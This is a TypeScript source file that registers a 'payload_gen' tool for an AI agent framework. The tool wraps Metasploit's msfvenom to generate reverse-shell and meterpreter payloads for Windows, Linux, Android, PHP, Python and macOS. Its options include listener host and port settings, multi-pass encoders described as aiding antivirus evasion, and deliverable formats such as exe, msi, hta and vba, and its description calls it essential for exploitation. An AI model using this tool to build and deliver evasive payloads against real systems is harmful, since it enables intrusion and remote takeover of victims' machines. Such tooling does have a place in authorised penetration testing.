export * as PayloadGenTool from "./payload-gen"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "payload_gen"

export const Input = Schema.Struct({
  payload: Schema.String.annotate({
    description:
      "Payload type (e.g. windows/x64/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp, android/meterpreter/reverse_tcp, php/meterpreter/reverse_tcp, python/meterpreter/reverse_tcp, osx/x64/meterpreter/reverse_tcp)",
  }),
  lhost: Schema.String.annotate({ description: "Listener/LHOST IP address" }),
  lport: Schema.Number.annotate({ description: "Listener/LPORT number" }),
  format: Schema.String.pipe(Schema.optional).annotate({
    description:
      "Output format: raw, c, csharp, dw, dword, elf, exe, exe-only, exe-service, exe-small, hta-psh, html, jar, js, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, python-reflection, vba, vbs, war. Default: exe.",
  }),
  encoder: Schema.String.pipe(Schema.optional).annotate({
    description: "Encoder (e.g. x86/shikata_ga_nai, x64/xor_dynamic, cmd/powershell_base64). Optional.",
  }),
  iterations: Schema.Number.pipe(Schema.optional).annotate({
    description: "Number of encoding iterations. Default: 1. Higher = more AV evasion but larger payload.",
  }),
  bad_chars: Schema.String.pipe(Schema.optional).annotate({
    description: "Bad characters to avoid (e.g. '\\x00\\x0a\\x0d'). Use with raw format.",
  }),
  output_path: Schema.String.pipe(Schema.optional).annotate({
    description: "Output file path. Default: ./payload.{format}",
  }),
  extra_args: Schema.String.pipe(Schema.optional).annotate({
    description: "Additional msfvenom arguments (e.g. '--platform windows --arch x64').",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  path: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Generate custom payloads via msfvenom (Metasploit). Supports all platforms (Windows, Linux, Android, macOS, PHP, Python, Java) and formats (exe, dll, elf, msi, war, jar, vba, ps1, raw, etc). Supports encoding for AV evasion, bad character avoidance, and custom output paths. Essential for creating deliverable payloads for exploitation.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const format = input.format ?? "exe"
              const outputPath = input.output_path ?? `./payload.${format}`
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"

              const args: string[] = ["-p", input.payload]
              args.push("LHOST=" + input.lhost)
              args.push("LPORT=" + String(input.lport))

              if (input.encoder) {
                args.push("-e", input.encoder)
                args.push("-i", String(input.iterations ?? 1))
              }

              if (input.bad_chars) {
                args.push("-b", input.bad_chars)
              }

              args.push("-f", format)
              args.push("-o", outputPath)

              if (input.extra_args) {
                args.push(...input.extra_args.split(/\s+/))
              }

              const cmd = ChildProcess.make("msfvenom", args, {
                shell,
                stdin: "ignore",
                forceKillAfter: Duration.seconds(10),
              })

              const result = yield* appProcess
                .run(cmd, {
                  combineOutput: true,
                  timeout: Duration.minutes(5),
                  maxOutputBytes: 10 * 1024 * 1024,
                })
                .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

              if (!result) {
                return {
                  output: "msfvenom failed or timed out. Ensure metasploit-framework is installed: apt install metasploit-framework (Linux) or download from Rapid7.",
                  path: outputPath,
                }
              }

              const stdout = result.output?.toString("utf8") ?? ""
              return {
                exit: result.exitCode,
                path: outputPath,
                output: result.exitCode === 0
                  ? `✅ Payload generated: ${outputPath}\nFormat: ${format}\nPayload: ${input.payload}\nLHOST=${input.lhost} LPORT=${input.lport}\n${input.encoder ? `Encoder: ${input.encoder} (${input.iterations ?? 1} iterations)\n` : ""}${stdout}`
                  : `❌ msfvenom failed (exit ${result.exitCode}):\n${stdout}`,
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Payload generation failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/payload-gen",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
